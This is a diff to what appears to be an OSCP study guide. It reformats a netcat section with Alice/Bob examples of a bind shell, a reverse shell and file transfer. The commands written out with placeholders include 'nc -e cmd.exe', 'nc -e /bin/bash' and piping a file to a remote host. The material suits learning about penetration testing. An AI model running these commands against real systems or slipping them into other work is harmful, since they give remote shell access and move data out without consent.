@@ -30,19 +30,23 @@ nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 
 <img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>
 
-<b>Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:</b>
+<b>Bind Shell:</b>
+
+Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
 
 (BOB): nc -nlvp <[PORT]> -e cmd.exe
 
-<b>Alice connects to Bob's pc:</b>
+Alice connects to Bob's pc:
 
 (ALICE): nc -nv <[BOB_IP]> <[PORT]>
 
-<b>Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:</b>
+<b>Reverse Shell:</b>
+
+Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
 
 (ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
 
-<b>Bob connects to Alice's pc:</b>
+Bob connects to Alice's pc:
 
 (BOB): nc -nlvp <[PORT]>
 
